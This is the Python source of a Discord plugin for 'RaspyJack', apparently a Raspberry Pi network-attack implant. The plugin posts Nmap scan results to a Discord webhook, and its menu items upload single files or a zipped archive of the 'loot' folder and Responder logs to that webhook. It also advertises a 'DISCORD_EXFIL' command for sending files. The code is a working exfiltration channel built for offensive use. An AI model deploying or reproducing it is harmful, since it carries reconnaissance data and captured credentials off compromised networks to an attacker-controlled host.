from __future__ import annotations
import os
import json
import requests
import threading
from datetime import datetime
from plugins.base import Plugin
from .helpers.discord_utils import (
    get_discord_webhook_url,
    send_file_to_discord,
    build_loot_archive,
    send_buffer_to_discord,
    DISCORD_ATTACHMENT_LIMIT,
)

def _send_notification(webhook_url: str, scan_label: str, file_path: str, target_network: str, interface: str):
    """Send Nmap scan notification to Discord."""
    try:
        if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
            print(f"[DiscordNotifier] Scan file is missing or empty: {file_path}")
            return
        embed = {
            "title": f"🔍 Nmap Scan Complete: {scan_label}",
            "description": f"**Target Network:** `{target_network}`\n**Interface:** `{interface}`\n**Timestamp:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "color": 0x00ff00,
            "fields": [
                {
                    "name": "📁 Scan Results",
                    "value": f"**File:** `{os.path.basename(file_path)}`\n**Size:** {os.path.getsize(file_path):,} bytes",
                    "inline": False
                }
            ],
            "footer": {"text": "RaspyJack Nmap Scanner"},
            "timestamp": datetime.now().isoformat()
        }
        with open(file_path, 'rb') as f:
            payload = {'payload_json': json.dumps({'embeds': [embed]})}
            files = {'file': (os.path.basename(file_path), f, 'text/plain')}
            response = requests.post(webhook_url, data=payload, files=files, timeout=30)
        if 200 <= response.status_code < 300:
            print("[DiscordNotifier] Webhook with file sent successfully.")
        else:
            print(f"[DiscordNotifier] Webhook failed: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"[DiscordNotifier] Error sending webhook: {e}")

class DiscordNotifierPlugin(Plugin):
    name = "DiscordNotifier"
    priority = 200

    def on_load(self, ctx: dict) -> None:
        self._ctx = ctx

    def get_config_schema(self) -> dict:
        """Return configuration schema for Discord plugin."""
        return {
            "nmap_notifications": {
                "type": "boolean",
                "label": "Nmap Notifications",
                "description": "Send Discord notifications when Nmap scans complete",
                "default": True
            }
        }

    def on_after_scan(self, label: str, args: list[str], result_path: str) -> None:
        # Check if nmap notifications are enabled
        if not self.get_config_value("nmap_notifications", True):
            return
            
        webhook_url = get_discord_webhook_url()
        if not webhook_url:
            return
        try:
            from wifi.raspyjack_integration import get_best_interface, get_nmap_target_network
            interface = get_best_interface()
            target_network = get_nmap_target_network(interface)
        except Exception:
            interface = "eth0"
            target_network = "unknown"
        thread = threading.Thread(
            target=_send_notification,
            args=(webhook_url, label, result_path, target_network, interface),
            daemon=True
        )
        thread.start()

    def on_config_changed(self, key: str, old_value, new_value) -> None:
        """React to configuration changes."""
        if key == "nmap_notifications":
            status = "enabled" if new_value else "disabled"
            print(f"[DiscordNotifier] Nmap notifications {status}")

    def get_info(self) -> str:
        webhook_url = get_discord_webhook_url()
        if webhook_url:
            # Extract webhook ID for display (hide token for security)
            try:
                webhook_parts = webhook_url.split('/')
                webhook_id = webhook_parts[-2] if len(webhook_parts) >= 2 else "unknown"
                masked_id = f"{webhook_id[:8]}...{webhook_id[-4:]}" if len(webhook_id) > 12 else webhook_id
            except:
                masked_id = "configured"
            
            # Get current configuration value
            nmap_notifications = self.get_config_value("nmap_notifications", True)
            
            info_lines = [
                "Discord webhook configured",
                f"Webhook ID: {masked_id}",
                f"Status: {'Ready' if nmap_notifications else 'Notifications disabled'}",
                "",
                "Current Configuration:",
                f"• Nmap notifications: {'ON' if nmap_notifications else 'OFF'}",
                "",
                "Available commands:",
                "• DISCORD_MESSAGE - Send messages", 
                "• DISCORD_EXFIL - Send files"
            ]
            return "\n".join(info_lines)
        else:
            info_lines = [
                "Discord webhook NOT configured",
                "",
                "Setup instructions:",
                "1. Create Discord webhook in server",
                "2. Edit /root/Raspyjack/discord_webhook.txt",
                "3. Add webhook URL to file",
                "4. Restart RaspyJack",
                "",
                "Current status: No notifications will be sent"
            ]
            return "\n".join(info_lines)

    # --- Menu integration -------------------------------------------------
    def provide_menu_items(self):
        """Provide custom menu items for this plugin."""
        items = []
        webhook_url = get_discord_webhook_url()
        if webhook_url:
            items.append(("Send file to Discord", self._menu_send_loot_file, '\uf1d8', "Upload a file to Discord"))
            items.append(("Send loot archive", self._menu_send_loot_archive, '\uf187', "Zip loot + logs and upload"))
        return items

    def _menu_send_loot_file(self):
        """Interactive file picker limited to loot/ directory; sends selected file."""
        webhook_url = get_discord_webhook_url()
        if not webhook_url:
            return
        wctx = self._ctx.get('widget_context')
        if not wctx:
            return
        try:
            from ui.widgets import explorer, dialog_info
        except Exception:
            return
        # Resolve root install path
        defaults = self._ctx.get('defaults')
        root_path = getattr(defaults, 'install_path', '/root/Raspyjack/') if defaults else '/root/Raspyjack/'
        loot_path = os.path.join(root_path, 'loot')
        if not os.path.isdir(loot_path):
            dialog_info(wctx, "loot/ directory not found", wait=True, center=True)
            return
        # Pick file
        file_path = explorer(wctx, loot_path, extensions='')
        if not file_path:
            return
        # Send file
        ok = send_file_to_discord(file_path, title=f"Loot: {os.path.basename(file_path)}")
        dialog_info(wctx, ("File sent" if ok else "Send failed"), wait=True, center=True)

    def _menu_send_loot_archive(self):
        """Build in-memory ZIP of loot/ + Responder/logs and send to Discord."""
        webhook_url = get_discord_webhook_url()
        if not webhook_url:
            return
        wctx = self._ctx.get('widget_context')
        if not wctx:
            return
        try:
            from ui.widgets import dialog_info, dialog_wait, dialog_wait_close
        except Exception:
            return
        defaults = self._ctx.get('defaults')
        root_path = getattr(defaults, 'install_path', '/root/Raspyjack/') if defaults else '/root/Raspyjack/'
        wait_handle = dialog_wait(wctx, text="Building zip...")
        buf, fname, size = build_loot_archive(root_path)
        dialog_wait_close(wctx, wait_handle)
        if not buf:
            dialog_info(wctx, fname[:48], wait=True, center=True)  # fname holds error message here
            return
        if size > DISCORD_ATTACHMENT_LIMIT:
            dialog_info(wctx, f"Archive too big\n{size/1024/1024:.1f} MB", wait=True, center=True)
            return
        wait_handle = dialog_wait(wctx, text="Uploading...")
        ok = send_buffer_to_discord(buf, fname, message=f"📦 Loot archive ({size/1024:.0f} KB)")
        dialog_wait_close(wctx, wait_handle)
        dialog_info(wctx, ("Archive sent" if ok else "Upload failed"), wait=True, center=True)

plugin = DiscordNotifierPlugin()
